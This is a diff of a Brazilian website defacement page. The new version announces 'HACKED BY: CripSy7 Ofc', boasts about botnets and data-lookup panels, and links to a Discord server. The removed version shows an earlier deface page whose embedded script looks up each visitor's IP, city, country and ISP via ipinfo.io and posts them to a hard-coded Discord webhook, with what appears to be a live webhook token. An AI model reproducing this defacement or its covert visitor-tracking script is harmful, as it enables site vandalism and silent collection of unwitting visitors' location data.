@@ -1,101 +1,88 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title>HACKED</title>
+  <meta charset="UTF-8">
+  <title>CripSy7 Ofc</title>
   <style>
+    @font-face {
+      font-family: 'Winter Fair';
+      src: url('WinterFair.ttf') format('truetype');
+      font-weight: normal;
+      font-style: normal;
+    }
+
     body {
-      background-color: black;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
       margin: 0;
       padding: 0;
+      background: black url('') no-repeat center center fixed;
+      background-size: contain;
+      font-family: 'Winter Fair', 'Courier New', monospace;
+      font-weight: bold;
+      color: cyan;
       overflow: hidden;
     }
 
-    .main-msg {
+    .container {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding-top: 80px;
+    }
+
+    .red-glow {
       color: red;
-      font-size: 48px;
+      font-size: 1.2em;
+      text-shadow: 0 0 10px red, 0 0 20px red;
+      margin-bottom: 30px;
+    }
+
+    .cyan-title {
+      color: cyan;
+      font-size: 1.4em;
+      text-shadow: 0 0 10px cyan;
+      margin-bottom: 40px;
+    }
+
+    .btn {
+      background-color: cyan;
+      color: black;
+      padding: 8px 16px;
+      font-size: 0.9em;
+      cursor: pointer;
       font-weight: bold;
-      margin-top: 20px;
-      animation: glow 1s ease-in-out infinite alternate;
+      transition: transform 0.2s, background-color 0.3s, box-shadow 0.3s;
+      display: inline-block;
+      margin-top: 40px;
+      text-shadow: none;
+      border: none;
+      box-shadow: 0 0 20px cyan, 0 0 30px cyan;
+      font-family: 'Winter Fair', sans-serif;
     }
 
-    .sub-msg {
-      color: white;
-      font-size: 16px;
-      margin-top: 10px;
-      animation: glow 1.5s ease-in-out infinite alternate;
+    .btn:hover {
+      animation: shake 0.4s;
+      background-color: #00eaea;
+      box-shadow: 0 0 30px cyan, 0 0 60px cyan;
     }
 
-    @keyframes glow {
-      from {
-        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
-      }
-      to {
-        text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
-      }
+    .btn:active {
+      transform: scale(0.98);
     }
 
-    img {
-      margin-top: 20px;
-      width: 300px;
-      border-radius: 10px;
-    }
-
-    .gif {
-      margin-top: 20px;
-    }
-
-    audio {
-      display: none;
+    @keyframes shake {
+      0% { transform: translate(2px, 1px) rotate(0deg); }
+      25% { transform: translate(-2px, -1px) rotate(-1deg); }
+      50% { transform: translate(2px, 1px) rotate(1deg); }
+      75% { transform: translate(-1px, -1px) rotate(0deg); }
+      100% { transform: translate(1px, 2px) rotate(-1deg); }
     }
   </style>
 </head>
 <body>
-  <div class="main-msg">VOCÊ FOI DOMINADO</div>
-  <div class="sub-msg">#ЦИКИА — Ninguém está seguro</div>
-
-  <img src="deface cci.jpg" alt="Deface CCI">
-
-  <div class="gif">
-    <img src="https://media.tenor.com/GsMShfRYo08AAAAd/eye-dark-eye.gif" alt="Olho escuro">
+  <div class="container">
+    <div class="red-glow">HACKED BY: CripSy7 Ofc - Azael'Sy7</div><br><br>
+    <div class="cyan-title">CripSy7 é mais que um nome — é formação, é scripts, é poder. Dominamos a aréa da cibersegurança derrubando paneleiros nojentos, e das criações das botnets e dos painéis de puxadas, com precisão nos nossos métodos e formas de resolver problemas. Silenciosos, eficazes, melhores que a LammerTeamKKKK. Somos a CripSy7.</div><br>
+    <button class="btn" onclick="window.location.href='https://discord.gg/RSN3yJwmdh'">Entrar no Discord</button>
   </div>
-
-  <audio autoplay loop>
-    <source src="video daface.mp4" type="audio/mp4">
-    Seu navegador não suporta áudio embutido.
-  </audio>
-
-  <!-- Script para capturar IP e enviar via webhook -->
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1385061151402102936/mpZy6kGaSw2h54FQ5dNCDwciTWkBbJTquno_CPtkXMJNv2AbMnfGuXx95h-CweqK_9tY"; // 🔁 Substitua pelo seu webhook real
-    const token = "https://api.ipinfo.io/lite/8.8.8.8?token=1d52fe0c2e72d5"; // 🔁 Substitua pelo seu token do ipinfo.io
-
-    fetch(`https://ipinfo.io/json?token=${token}`)
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip || "Desconhecido";
-        const cidade = data.city || "Desconhecido";
-        const pais = data.country || "Desconhecido";
-        const org = data.org || "Desconhecida";
-
-        const payload = {
-          content: `📡 IP detectado:\n🌍 IP: ${ip}\n🏙️ Cidade: ${cidade}\n🇧🇷 País: ${pais}\n🏢 Org: ${org}`
-        };
-
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-      })
-      .catch(error => {
-        console.error("Erro ao capturar o IP:", error);
-      });
-  </script>
 </body>
 </html>
